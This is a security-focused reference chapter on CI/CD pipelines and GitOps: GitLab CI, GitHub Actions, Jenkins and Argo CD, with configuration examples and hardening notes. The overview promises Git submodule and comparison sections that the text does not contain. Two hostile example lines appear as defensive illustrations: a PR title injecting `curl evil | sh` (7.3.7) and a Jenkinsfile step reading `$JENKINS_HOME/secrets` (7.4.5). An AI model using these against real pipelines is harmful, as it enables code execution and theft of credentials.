# Chapter 7 — CI/CD & GitOps

## Overview

This chapter covers **the automation chain that takes source code from a developer's commit all the way to running in production serving real users**, and the measures that keep that chain from becoming an attack path. This is a critical area for security engineers: the pipeline typically holds secrets (passwords, tokens, infrastructure access) and runs with high privilege, so compromising the pipeline is equivalent to compromising the entire system. This section defines the core concepts and the problem each one solves; later sections dig into the technical mechanisms.

**CI/CD (Continuous Integration / Continuous Delivery or Deployment).** A model for automating the software pipeline: source code passes through a series of stages (build, test, security scanning, packaging, deployment). **CI** automatically integrates and tests every commit to detect regressions at the commit level. **CD** automatically promotes vetted artifacts to the target environment — *Continuous Delivery* requires a manual approval gate before production, while *Continuous Deployment* has no such gate.
- Problem it solves: it replaces manual build/deploy processes (slow, error-prone, inconsistent) with an automated, repeatable process that catches errors early and leaves an audit trail for every change.

**Pipeline as Code.** Defining the entire pipeline as source files (usually YAML/Groovy) stored in the repository itself, instead of configuring it manually through a UI (click-ops).
- Problem it solves: the pipeline is versioned, reviewed through merge requests, and reproducible per commit. Sensitive configuration becomes subject to change control rather than being a hidden, untraceable setting.

**GitLab CI.** The CI/CD system built into GitLab. The `.gitlab-ci.yml` file in the repository defines **jobs**; GitLab dispatches jobs to **runners** for execution.
- Problem it solves: it provides all-in-one CI/CD for teams using GitLab without needing external tools. The critical security points are the secret storage mechanism (masked/protected variables) and the runner/executor choice — a misconfiguration lets a malicious merge request read secrets or execute commands on the host.

**GitHub Actions.** GitHub's CI/CD system. A workflow file in `.github/workflows/` defines **workflows** consisting of multiple **jobs**, each job consisting of multiple **steps**; a step can reuse a shared **action**.
- Problem it solves: rapid automation thanks to a ready-made action ecosystem and OIDC support. Key risk: third-party actions can be backdoored, and confusing the two triggers `pull_request` and `pull_request_target` is the most common secret-leakage vulnerability.

**Jenkins.** A self-hosted automation server, independent of the SCM platform. Its architecture consists of a **controller** that orchestrates and **agents** that execute builds; pipelines are defined in a `Jenkinsfile` (Groovy DSL).
- Problem it solves: high flexibility and the ability to run on-prem (no Internet required), suitable for large enterprise environments. The trade-off: an ecosystem of thousands of **plugins** is a large attack surface that demands strict updates and configuration.

**GitOps and Argo CD.** GitOps treats **Git as the single source of truth** for the system's desired state. **Argo CD** is an agent running *inside* the Kubernetes cluster that continuously compares the state declared in Git with the actual state and reconciles them to match.
- Problem it solves: it replaces the CI-push model (where the cluster credential must be carried outside) with a pull model — the credential never leaves the cluster, and every change is a commit, making tracing and rollback easy. Self-heal detects and reverts unauthorized changes made directly on the cluster, adding another layer of defense.

**Git Submodule.** A mechanism for embedding one (child) Git repository inside another (parent) repository, **pinned to a specific commit SHA** via a gitlink, without copying the child repo's contents.
- Problem it solves: many projects share a common set of templates (CI/CD configuration, security scripts) in one child repo; each project pins exactly the reviewed version, so it won't have its build broken by sudden template changes. The trade-off: complex operations (easy to forget to update or clone correctly) and supply-chain risk if the child repo is compromised.

**Tool comparison and selection.** The final section contrasts the three CI engines (GitLab CI, GitHub Actions, Jenkins) and compares the push deployment model (CI pushes to infrastructure itself) with the pull model (GitOps/Argo CD).
- Problem it solves: no tool is optimal for every situation. Understand each one's strengths, weaknesses, and security risks to choose correctly. The modern model usually combines them: CI handles build and test, Argo CD handles deployment, each component keeping minimal privilege.

> A technical reference for security engineers (Blue Team / AppSec / DevSecOps). Each section follows the structure: **WHAT IT IS → HOW IT WORKS INTERNALLY → REAL-WORLD EXAMPLE → SECURITY NOTES**. Specific version numbers and tool behaviors change across versions; anything that needs verification is explicitly flagged.

---

## 7.1. CI/CD concepts, pipeline as code, and the foundational data model

### 7.1.1. CI, CD (Delivery), and CD (Deployment) — precise definitions

- **CI (Continuous Integration):** every commit/merge request is automatically built and tested. Technical goal: detect integration conflicts and regressions at the commit level, keeping the main branch (`main`/`master`) always "green" (build + test pass).
- **CD — Continuous Delivery:** every artifact that has passed CI is always in a **release-ready** state, but the step of pushing to production requires a **manual gate** (manual approval).
- **CD — Continuous Deployment:** there is no manual gate; every commit that passes tests is automatically deployed to production.

The difference between Delivery and Deployment **is solely a single approval gate**. From a security standpoint, that gate is the change-control checkpoint — where compliance evidence (SoD — Separation of Duties) is attached.

### 7.1.2. Typical pipeline stages

```
 source → build → test → sast/sca → package → publish → deploy(staging) → integration test → deploy(prod) → verify
   │        │       │        │           │         │           │                 │                  │           │
 commit   compile  unit/   code/        package   push to    deploy            end-to-end         deploy       smoke
 /MR               int.    dependency   (image/jar) registry  intermediate      test              production   test
                   test    scan                               environment
```

Each stage is a **trust boundary**: an artifact passing through a stage is "promoted" in trust. Supply-chain attacks aim to inject a payload **before** a stage so that it gets promoted in trust without passing through controls.

### 7.1.3. Pipeline as Code — why?

Instead of configuring the pipeline through a UI (click-ops), the entire pipeline definition lives in a YAML/Groovy file **stored in the repository itself**. The design rationale:

| Property | Why it matters (security/operations perspective) |
|---|---|
| Versioned | Pipeline changes → diffable, auditable via git log |
| Reviewable | Pipeline changes go through code review/MR like any other code |
| Reproducible | Same commit → same pipeline; no hidden "config drift" in the UI |
| Co-located | Pipeline travels with the code → different branches have different pipelines |

**Core security note:** because pipeline-as-code lives in the repo and usually runs with high privilege (access to secrets, registry, cluster), anyone who can edit the pipeline file (via MR/PR, or a direct commit to an unprotected branch) gains the ability to **execute arbitrary code in the CI environment**. This is the primary attack surface throughout this chapter.

---

## 7.2. GitLab CI — in detail

### 7.2.1. Execution model and the `.gitlab-ci.yml` file

GitLab CI reads the `.gitlab-ci.yml` file at the **repository root** (the path can be reconfigured in Settings → CI/CD). This file is YAML defining the **jobs**. Jobs are grouped into **stages**; jobs in the same stage run **in parallel**, while stages run **sequentially**. A job runs only when every job in the preceding stage succeeds (unless `needs` is used to create a DAG).

#### Full structure — table of top-level global keywords

| Key | Type | Meaning | Example |
|---|---|---|---|
| `stages` | list | The order of stages | `[build, test, deploy]` |
| `variables` | map | Global environment variables | `DOCKER_DRIVER: overlay2` |
| `default` | map | Default configuration for every job (image, before_script, etc.) | `image: alpine:3.20` |
| `workflow` | map | Rules for creating/not creating a pipeline | `rules:` |
| `include` | list/map | Import another CI file (local/remote/template/project) | `- local: ci/sast.yml` |
| `cache` | map | Global cache | `paths: [node_modules]` |

#### Job-level keys — detailed table

| Key | Meaning | Technical notes |
|---|---|---|
| `stage` | The stage containing the job | Defaults to `test` if not declared |
| `script` | The main shell commands (required) | List of strings; each element is one command |
| `before_script` | Commands run before `script` | Combined into the same shell as `script` (same process tree) |
| `after_script` | Commands run afterward, **even if the job fails** | Runs in a **separate** shell — variables from `script` are gone |
| `rules` | Conditions for running/variables/when allow_failure applies | The modern replacement for `only/except` |
| `only` / `except` | Run conditions (legacy) | Still usable but not mixed with `rules` in the same job |
| `artifacts` | Files/paths saved after the job | Passed between stages; supports `expire_in`, `reports` |
| `cache` | Directories cached between runs | Differs from artifacts: cache speeds things up, with no existence guarantee |
| `needs` | Creates a DAG, runs a job without waiting for the entire previous stage | Element count limited depending on version |
| `services` | Auxiliary containers running alongside the job (DB, docker:dind) | Shared network with the job |
| `tags` | Selects runners by tag | Matches the runner's registered tags |
| `environment` | Binds the job to an environment (deploy) | Shown in the UI, supports rollback |
| `when` | `on_success`/`on_failure`/`always`/`manual`/`delayed` | `manual` creates a click-to-run job |
| `allow_failure` | A failing job doesn't fail the pipeline | Defaults to true for `when: manual` |
| `retry` | Number of retry attempts | Can be filtered by failure type |
| `timeout` | Job time limit | Overrides the project timeout |
| `dependencies` | Selects which job's artifacts to download | Empty `[]` = download no artifacts |

### 7.2.2. `rules` — step-by-step evaluation mechanism

`rules` is an **ordered list**. GitLab walks it top to bottom, **stops at the first matching rule**, then applies that rule's `when`/`variables`/`allow_failure`. If no rule matches → the job is **not added** to the pipeline.

Each rule can use:
- `if:` — an expression over CI variables (comparisons `==`, `!=`, `=~` regex, `&&`, `||`).
- `changes:` — a list of glob paths; matches if the commit changed those files.
- `exists:` — a file exists in the repo.

```yaml
test-job:
  stage: test
  script: ["pytest -q"]
  rules:
    # Rule 1: MR targeting main → run, do not allow failure
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event" && $CI_MERGE_REQUEST_TARGET_BRANCH_NAME == "main"'
      when: on_success
      allow_failure: false
    # Rule 2: only run when Python files change
    - if: '$CI_COMMIT_BRANCH'
      changes: ["**/*.py"]
    # Rule 3: otherwise the job is not added (implicit when the list ends)
```

**Why the "stop at the first match" design:** it behaves like an ACL filter — order matters, with specific rules placed on top and general rules placed below.

### 7.2.3. Important predefined CI/CD variables

| Variable | Meaning | Example value |
|---|---|---|
| `CI_PIPELINE_SOURCE` | The trigger source | `push`, `merge_request_event`, `schedule`, `web`, `trigger` |
| `CI_COMMIT_SHA` | Full commit SHA (40 hex = 160-bit SHA-1) | `9b2c...` |
| `CI_COMMIT_REF_NAME` | Branch/tag name | `main` |
| `CI_JOB_TOKEN` | Temporary token, living for the job's lifetime | (hidden) |
| `CI_REGISTRY` / `CI_REGISTRY_IMAGE` | Integrated registry | `registry.gitlab.com/group/proj` |
| `CI_PROJECT_DIR` | The checkout directory | `/builds/group/proj` |
| `CI_DEFAULT_BRANCH` | The default branch | `main` |

`CI_JOB_TOKEN` is notable for security: it allows a job to access certain GitLab APIs and pull/push the project's own registry. Its scope is configurable in **CI/CD → Token Access**; an overly broad configuration lets project A read project B.

### 7.2.4. Runner and Executor — detailed registration flow

A **Runner** is an agent (the `gitlab-runner` binary, written in Go) that registers with GitLab. When a job arrives, GitLab dispatches it to a runner with matching tags. The runner uses an **executor** to run it.

| Executor | How it runs jobs | Isolation | Use when |
|---|---|---|---|
| `shell` | Runs directly on the runner's host | **None** (shared FS, user) | Small lab; high risk |
| `docker` | Each job in a new container from `image:` | Container-level | Most common |
| `docker+machine` | Spins up VMs on demand | VM-level | Autoscaling |
| `kubernetes` | Each job is a Pod | Pod/namespace | Large clusters |

**Runner registration flow, step by step:**

```
1. Admin creates a runner in the UI → GitLab generates a "runner authentication token" (prefix glrt-)
2. On the runner machine: gitlab-runner register --url https://gitlab.example.com --token glrt-xxxx
3. Runner calls POST /api/v4/runners/verify with the token → GitLab confirms
4. The configuration is written to /etc/gitlab-runner/config.toml
5. gitlab-runner run: long-poll POST /api/v4/jobs/request every few seconds
6. When a job arrives → GitLab returns the job JSON (script, variables, dependencies, artifacts URL)
7. The runner executes via the executor, streams logs (PATCH /api/v4/jobs/:id/trace), and returns the status
```

Sample `config.toml` (docker executor):

```toml
concurrent = 4
check_interval = 3

[[runners]]
  name = "docker-runner-01"
  url = "https://gitlab.example.com"
  token = "glrt-REDACTED"
  executor = "docker"
  [runners.docker]
    image = "alpine:3.20"
    privileged = false          # IMPORTANT: privileged=true ⇒ easy container escape
    volumes = ["/cache"]
    pull_policy = ["if-not-present"]
```

**Runner security notes:**
- `privileged = true` (often enabled to run Docker-in-Docker) allows a job to escape to the host. Isolate privileged runners in a separate environment.
- `shell` executor + shared runner = a malicious MR runs commands on the runner host. Never use the shell executor for public/untrusted repos.
- Mounting `/var/run/docker.sock` into a job = granting host root. Absolutely avoid this for shared runners.

### 7.2.5. Masked and protected variables — the precise mechanism

In **Settings → CI/CD → Variables**:

- **Masked:** GitLab replaces the value with `[MASKED]` in the **logs**. The technical constraints for a value to be maskable: it must be a single line, meet a minimum length (default 8 characters), and contain only allowed characters (verify per version). Masking **only hides logs**; it cannot help if a job prints `echo $VAR | base64` (transformed → no longer matches the mask pattern).
- **Protected:** the variable is only injected into jobs running on a **protected branch/tag**. The purpose: prevent an MR from an ordinary branch (created by an attacker) from reading production secrets.

```yaml
deploy-prod:
  stage: deploy
  environment: production
  script:
    - echo "Deploying with token..."
    - curl -H "PRIVATE-TOKEN: $PROD_DEPLOY_TOKEN" "$DEPLOY_API"
  rules:
    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'   # main is protected
```
`$PROD_DEPLOY_TOKEN` is marked Protected + Masked → an MR from `feature/x` does not receive this variable.

**Classic vulnerability:** a variable is protected but the branch is not set as protected in **Settings → Repository → Protected branches** ⇒ the protection is void. The two configurations must match.

### 7.2.6. `artifacts` vs `cache`

| | `artifacts` | `cache` |
|---|---|---|
| Purpose | Pass output between stages, download | Speed up (reuse dependencies) |
| Existence guarantee | Yes (within the pipeline lifetime) | No (best-effort) |
| Key | Per job | `cache:key` (e.g., by `$CI_COMMIT_REF_SLUG`) |
| Storage | GitLab object storage | Object storage / local runner |

```yaml
build:
  stage: build
  script: ["npm ci", "npm run build"]
  cache:
    key: "$CI_COMMIT_REF_SLUG"
    paths: ["node_modules/"]
  artifacts:
    paths: ["dist/"]
    expire_in: 1 week
    reports:
      sast: gl-sast-report.json   # special report → shows on the Security Dashboard
```

**Security:** `artifacts` can inadvertently package secrets (e.g., a `.env` file, `kubeconfig`). Cache poisoning: if the cache key collides between a trusted and an untrusted branch, an attacker poisons the `node_modules` cache and the trusted branch reuses it. Separate the cache key by ref.

### 7.2.7. A real pipeline example: test + SAST + deploy

```yaml
stages: [build, test, security, package, deploy]

default:
  image: node:20-alpine

variables:
  IMAGE: "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA"

# SAST + Dependency scanning using GitLab's official templates
include:
  - template: Security/SAST.gitlab-ci.yml
  - template: Security/Dependency-Scanning.gitlab-ci.yml

build:
  stage: build
  script: ["npm ci", "npm run build"]
  artifacts: { paths: ["dist/"], expire_in: 1h }

unit-test:
  stage: test
  script: ["npm test -- --ci --reporters=default --reporters=jest-junit"]
  artifacts:
    reports: { junit: junit.xml }

container-build:
  stage: package
  image: docker:27
  services: ["docker:27-dind"]
  variables: { DOCKER_TLS_CERTDIR: "/certs" }
  script:
    - docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" "$CI_REGISTRY"
    - docker build -t "$IMAGE" .
    - docker push "$IMAGE"
  rules:
    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'

deploy-staging:
  stage: deploy
  image: bitnami/kubectl:1.30
  environment: { name: staging, url: https://staging.example.com }
  script:
    - kubectl set image deployment/app app="$IMAGE" -n staging
  rules:
    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'

deploy-prod:
  stage: deploy
  image: bitnami/kubectl:1.30
  environment: { name: production, url: https://app.example.com }
  when: manual                       # Continuous Delivery gate
  script:
    - kubectl set image deployment/app app="$IMAGE" -n production
  rules:
    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'
```

Sample output (trace log of the `unit-test` job, abridged):

```
Running with gitlab-runner 17.x (docker)
Preparing the "docker" executor
Using docker image node:20-alpine ...
$ npm test -- --ci ...
PASS  src/app.test.js
Test Suites: 12 passed, 12 total
Tests:       48 passed, 48 total
Uploading artifacts for successful job
  junit.xml: found 1 matching artifact files
Job succeeded
```

---

## 7.3. GitHub Actions

### 7.3.1. The model: workflow → job → step

Workflow files live in `.github/workflows/*.yml`. A **workflow** contains multiple **jobs**; each job runs on a **runner** (VM/container); each job has multiple **steps**; a step either runs `run:` (shell) or `uses:` (a reusable **action**).

| Level | Main keys | Notes |
|---|---|---|
| Workflow | `name`, `on`, `permissions`, `env`, `concurrency`, `jobs` | `on` defines the trigger |
| Job | `runs-on`, `needs`, `if`, `strategy`, `permissions`, `steps`, `environment`, `outputs` | `needs` creates dependencies |
| Step | `uses`, `with`, `run`, `env`, `id`, `if` | `with` passes inputs to an action |

### 7.3.2. `on` — triggers in detail

```yaml
on:
  push:
    branches: ["main"]
    paths: ["src/**"]
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:          # manual click
    inputs:
      environment:
        type: choice
        options: [staging, production]
  schedule:
    - cron: "0 2 * * *"       # 02:00 UTC every day
```

**An extremely important security difference — `pull_request` vs `pull_request_target`:**

| Trigger | Code that runs | Secrets available | `GITHUB_TOKEN` |
|---|---|---|---|
| `pull_request` | The **PR's** code (fork) | **No** (default) | Read-only by default |
| `pull_request_target` | The **base branch's** workflow | **Yes** | Read/write |

`pull_request_target` runs in the context of the base repo **with secrets**, but if it checks out and executes the PR's code (`ref: ${{ github.event.pull_request.head.sha }}`), then an attacker from a fork can read every secret. This is the most common vulnerability in GitHub Actions.

### 7.3.3. `GITHUB_TOKEN` and `permissions`

Each run receives a temporary `GITHUB_TOKEN` (expires when the job finishes). Its scope is controlled by `permissions`:

```yaml
permissions:
  contents: read        # the default should be read
  packages: write       # needed to push to GHCR
  id-token: write       # REQUIRED for OIDC
```

The least-privilege principle: set `permissions: { contents: read }` at the workflow level, and grant specific elevated permissions only on the jobs that need them.

### 7.3.4. Secrets, masking, and OIDC

- **Secrets** (`${{ secrets.NAME }}`): stored encrypted, automatically masked in logs (replaced with `***`). As with GitLab, masking only hides the literal value — transforming it via base64/substring will expose it.
- **OIDC (OpenID Connect):** instead of storing static cloud credentials, the runner requests a **short-lived JWT** from GitHub; the cloud (AWS/GCP/Azure) trusts GitHub as an IdP and exchanges the JWT for temporary credentials.

The structure of GitHub's OIDC JWT (a JWT = 3 Base64URL parts separated by `.`):

```
header.payload.signature
```

| Part | Content | Example field |
|---|---|---|
| Header | `{"alg":"RS256","kid":"...","typ":"JWT"}` | RSA-256 signing algorithm |
| Payload | claims | `iss`, `sub`, `aud`, `exp`, `repository`, `ref` |
| Signature | RSASSA-PKCS1-v1_5 over SHA-256 | 256 bytes with an RSA-2048 key |

The `sub` (subject) claim is the core of the trust policy. Example:

```
sub = repo:my-org/my-repo:ref:refs/heads/main
iss = https://token.actions.githubusercontent.com
aud = sts.amazonaws.com
```

The AWS trust policy must lock down `sub` tightly:

```json
{
  "Effect": "Allow",
  "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"},
    "StringLike": {"token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"}
  }
}
```

**Vulnerability:** using `StringLike` with `repo:my-org/*:*` allows **any branch/PR** in the org to assume the role. You must pin the `ref` or use an `environment`.

### 7.3.5. `uses` and pinning actions

`uses: actions/checkout@v4` references an action. The reference can be a tag (`@v4`), a branch (`@main`), or a **commit SHA** (`@8f4b...`).

| Pinning method | Stability | Safety |
|---|---|---|
| `@main` | Low | Low — the owner pushes a new commit = new code runs |
| `@v4` (tag) | Medium | Medium — a tag can be moved |
| `@<full-40-hex-SHA>` | High | High — the SHA is immutable |

**Security recommendation:** pin third-party actions by the **full 40-character SHA-1** (160 bit), with a tag comment for readability:

```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
```

### 7.3.6. A real workflow example: matrix test + SAST + build + OIDC deploy

```yaml
name: ci
on:
  pull_request:
  push: { branches: [main] }

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        node: [18, 20, 22]
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a  # v4.2.0
        with: { node-version: "${{ matrix.node }}" }
      - run: npm ci
      - run: npm test

  codeql:
    runs-on: ubuntu-latest
    permissions: { security-events: write, contents: read }
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - uses: github/codeql-action/init@v3
        with: { languages: javascript }
      - uses: github/codeql-action/analyze@v3

  deploy:
    needs: [test, codeql]
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write        # OIDC
      contents: read
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
          aws-region: ap-southeast-1
      - run: aws s3 sync ./dist s3://my-bucket --delete
```

**Marketplace action** (`aws-actions/configure-aws-credentials`): takes `role-to-assume`, calls `sts:AssumeRoleWithWebIdentity` using the OIDC JWT obtained from `id-token: write`, and sets the environment variables `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY`/`AWS_SESSION_TOKEN` for subsequent steps.

### 7.3.7. Consolidated GitHub Actions security notes

- **Script injection via context:** `run: echo "${{ github.event.pull_request.title }}"` — if the title contains `"; curl evil | sh`, the command is interpolated **before** the shell runs → RCE. The safe way: pass it into an environment variable and reference it as `"$TITLE"`.
- Disable `Allow all actions` at the org level; whitelist actions by verified creator + SHA.
- Set minimal default `permissions` at the org/repo level.

---

## 7.4. Jenkins

### 7.4.1. The controller/agent architecture

- **Controller** (formerly "master"): web UI, scheduler, config storage, build orchestration. You should **not** run builds on the controller (build executors = 0) to prevent build code from accessing the controller filesystem.
- **Agent** (formerly "slave"): a node that executes builds. It connects via **SSH**, **JNLP/inbound (TCP)**, or as a dynamic agent (Kubernetes/Docker plugin).

```
   Developer ──push──> SCM (Git)
        │ webhook
        ▼
  ┌───────────────┐   dispatch build  ┌──────────┐
  │  Controller   │ ───────────────>  │ Agent A  │ (linux, label: docker)
  │  (UI, queue)  │ <──── log ──────  │ Agent B  │ (windows)
  └───────────────┘                   └──────────┘
```

The inbound agent protocol (JNLP) handshakes over a configurable TCP port. The agent authenticates with a **secret** issued by the controller. **Note:** exposing the agent port to the Internet + a weak secret = risk of RCE on the controller.

### 7.4.2. Declarative vs scripted Jenkinsfile

Jenkins Pipeline uses the Groovy DSL. Two styles:

- **Declarative:** a fixed structure (`pipeline { agent ... stages ... }`), validatable, easy to read. Recommended.
- **Scripted:** plain Groovy (`node { ... }`), flexible but error-prone and hard to audit.

#### Declarative — the main blocks

| Block | Required | Meaning |
|---|---|---|
| `pipeline` | Yes | The outermost wrapper |
| `agent` | Yes | Node/label/docker that runs the pipeline |
| `stages` → `stage` → `steps` | Yes | The unit of work |
| `environment` | No | Environment variables (can read credentials) |
| `options` | No | timeout, retry, buildDiscarder |
| `parameters` | No | Input at trigger time |
| `when` | No | Condition for running the stage |
| `post` | No | Post-actions (`always`, `success`, `failure`, `unstable`) |

#### Scripted — a minimal example

```groovy
node('docker') {
    stage('Build') { sh 'npm ci && npm run build' }
    stage('Test')  { sh 'npm test' }
}
```

### 7.4.3. Credentials — the mechanism

Jenkins **Credentials** store secrets encrypted, referenced by ID. In a pipeline you use `credentials()` or `withCredentials`:

```groovy
environment {
    AWS_CRED = credentials('aws-deploy')   // creates AWS_CRED_USR and AWS_CRED_PSW
}
```

Or explicit binding:

```groovy
withCredentials([string(credentialsId: 'prod-token', variable: 'TOKEN')]) {
    sh 'curl -H "Authorization: Bearer $TOKEN" https://api.example.com/deploy'
}
```

Jenkins automatically **masks** the credential value in the console log. But like other systems, transforming the value (printing parts of it) exposes it. Note: avoid `sh "echo ${TOKEN}"` (Groovy interpolation, interpolated outside the shell, easily exposed + injectable) — use `sh 'echo $TOKEN'` (single quotes, the shell reads the env itself).

### 7.4.4. A real Jenkinsfile example (declarative)

```groovy
pipeline {
    agent { label 'docker' }

    options {
        timeout(time: 30, unit: 'MINUTES')
        buildDiscarder(logRotator(numToKeepStr: '20'))
        disableConcurrentBuilds()
    }

    environment {
        IMAGE      = "registry.example.com/app:${env.GIT_COMMIT.take(8)}"
        REGISTRY   = credentials('registry-creds')   // REGISTRY_USR / REGISTRY_PSW
    }

    stages {
        stage('Build') {
            steps { sh 'npm ci && npm run build' }
        }

        stage('Test') {
            steps { sh 'npm test -- --ci' }
            post { always { junit 'junit.xml' } }
        }

        stage('SAST') {
            steps {
                sh 'docker run --rm -v "$PWD:/src" returntocorp/semgrep semgrep --config=auto --error /src'
            }
        }

        stage('Package & Push') {
            when { branch 'main' }
            steps {
                sh 'echo "$REGISTRY_PSW" | docker login registry.example.com -u "$REGISTRY_USR" --password-stdin'
                sh 'docker build -t "$IMAGE" .'
                sh 'docker push "$IMAGE"'
            }
        }

        stage('Deploy Prod') {
            when { branch 'main' }
            steps {
                input message: 'Deploy to production?', ok: 'Deploy'   // manual gate
                sh 'kubectl set image deployment/app app="$IMAGE" -n production'
            }
        }
    }

    post {
        failure { echo 'Build failed — send alert' }
        always  { cleanWs() }
    }
}
```

Sample output (console, abridged):

```
[Pipeline] stage (Test)
+ npm test -- --ci
Tests: 48 passed
[Pipeline] junit
Recording test results
[Pipeline] stage (Deploy Prod)
Input requested: Deploy to production? -> (Proceed / Abort)
```

### 7.4.5. Plugins and the attack surface

Jenkins is plugin-driven (thousands of plugins). Each plugin is an attack surface. Classic issues:
- **Script Security / Groovy sandbox:** Groovy pipelines run in a sandbox; methods outside the whitelist require admin approval (Manage Jenkins → In-process Script Approval). Bypassing the sandbox = RCE.
- **Plugin CVEs:** delayed updates → published vulnerabilities get exploited.
- **Build executors on the controller:** if left > 0, a malicious Jenkinsfile `sh 'cat $JENKINS_HOME/secrets/*'` steals the key used to decrypt credentials.

**Defenses:** controller executors = 0, ephemeral agents (a K8s pod per build), enable CSRF protection, update plugins, RBAC via the Matrix/Role Strategy plugin, and auditing via the Audit Trail plugin.

---

## 7.5. Argo CD & GitOps

### 7.5.1. The principle: Git as the single source of truth

GitOps inverts the "CI push to cluster" model. Instead:
1. The system's desired state is declared **declaratively** in Git (K8s manifests, Helm, Kustomize).
2. An **in-cluster agent** (Argo CD) continuously compares the **desired state (Git)** with the **live state (cluster)** and **reconciles** them to match.

| Criterion | CI-push (kubectl from the pipeline) | GitOps (pull, Argo CD) |
|---|---|---|
| Who touches the cluster | The pipeline (needs cluster credentials placed in CI) | The in-cluster agent (credentials never leave the cluster) |
| Source of truth | The cluster's actual state | Git |
| Drift detection | No | Yes (live vs desired) |
| Cluster credentials | Stored in CI (risky) | No need to export them outside |
| Audit | Pipeline logs | Git history (every change = a commit) |
| Rollback | Re-run the pipeline | `git revert` |

**Why GitOps is safer regarding credentials:** in CI-push, the kubeconfig/admin token sits in a CI secret — a large attack surface (any job can abuse it). In GitOps, the in-cluster Argo CD pulls and applies manifests itself; no cluster credential needs to leave the cluster.

### 7.5.2. The reconcile loop — detailed state machine

```
        ┌──────────────────────────────────────────────────┐
        │                  RECONCILE LOOP                    │
        │  (default every ~180s + webhook + manual sync)     │
        └──────────────────────────────────────────────────┘
   1. Get the desired state: clone/pull repo @ targetRevision
   2. Render the manifest (Helm template / Kustomize build / plain)
   3. Get the live state: query the Kubernetes API for the resources
   4. Diff desired vs live (normalize: drop cluster-generated fields)
   5. Compute SYNC STATUS:
        - Synced      : desired == live
        - OutOfSync   : differ (drift or a new commit)
   6. Compute HEALTH STATUS (per resource):
        Healthy / Progressing / Degraded / Suspended / Missing
   7. If OutOfSync and auto-sync is on → apply (server-side apply)
   8. If selfHeal is on and there is manual drift → overwrite back to desired
```

Two **independent** status axes:
- **Sync status:** does Git match the cluster?
- **Health status:** is the resource working well (e.g., a Deployment has enough replicas ready)?

### 7.5.3. The Application CRD — field by field

Argo CD defines an **Application** (the CRD `argoproj.io/v1alpha1`):

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: my-app
  namespace: argocd
  finalizers:
    - resources-finalizer.argocd.argoproj.io   # cascade-delete resources when the App is deleted
spec:
  project: default
  source:
    repoURL: https://github.com/my-org/k8s-manifests.git
    targetRevision: main          # branch/tag/commit
    path: apps/my-app/overlays/prod
    # helm: { valueFiles: [values-prod.yaml] }   # if using Helm
  destination:
    server: https://kubernetes.default.svc       # the target cluster
    namespace: my-app
  syncPolicy:
    automated:
      prune: true                 # delete resources no longer in Git
      selfHeal: true              # overwrite manual drift
      allowEmpty: false
    syncOptions:
      - CreateNamespace=true
      - ServerSideApply=true
    retry:
      limit: 5
      backoff: { duration: 5s, factor: 2, maxDuration: 3m }
```

| Field | Meaning | Security note |
|---|---|---|
| `spec.project` | AppProject (RBAC, boundary) | `default` allows any repo/cluster — you should create a dedicated project that restricts `sourceRepos`, `destinations` |
| `source.repoURL` | The source repo | Must be in the AppProject's whitelist |
| `targetRevision` | The tracked revision | `HEAD`/branch = continuous tracking; pinning a SHA = immutable |
| `destination.server` | The target cluster | Restricted within the AppProject |
| `syncPolicy.automated.prune` | Delete surplus resources | Enable carefully — it can delete the wrong things |
| `selfHeal` | Auto-fix drift | Prevents manual `kubectl edit` changes from persisting |

### 7.5.4. Sync: manual, auto-sync, self-heal — the differences

- **Manual sync:** it sees OutOfSync but does **not** auto-apply; an operator clicks "Sync".
- **Auto-sync (`automated`):** a new commit to Git → auto-applied in the next reconcile cycle.
- **Self-heal:** when someone `kubectl edit`s a resource (drift), Argo detects live ≠ desired and **overwrites it back to Git**. This is a defensive mechanism against unauthorized cluster changes: an attacker modifies a Deployment to inject a malicious sidecar → Argo automatically reverts it within minutes.

### 7.5.5. The App of Apps pattern

A "root" Application points to a directory containing **other Application manifests**. Argo syncs the root → creates the child Apps → each child syncs the actual workload. This is used to bootstrap an entire cluster from one Git repo.

```yaml
# root-app.yaml — manages the child Applications
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata: { name: root, namespace: argocd }
spec:
  project: default
  source:
    repoURL: https://github.com/my-org/gitops.git
    targetRevision: main
    path: bootstrap/apps          # the directory containing multiple Application YAMLs
  destination: { server: https://kubernetes.default.svc, namespace: argocd }
  syncPolicy: { automated: { prune: true, selfHeal: true } }
```

**Security:** whoever can edit `bootstrap/apps` controls the entire cluster. The GitOps repo must have strict branch protection + required reviews — it is equivalent to cluster-admin privilege.

### 7.5.6. Argo CD security notes

- Argo CD runs with high privilege in the cluster (often cluster-admin when it manages many namespaces). Compromising Argo = compromising the cluster.
- Lock down the AppProject: restrict `sourceRepos`, `destinations`, `clusterResourceWhitelist`.
- Protect the GitOps repo like production: signed commits, branch protection.
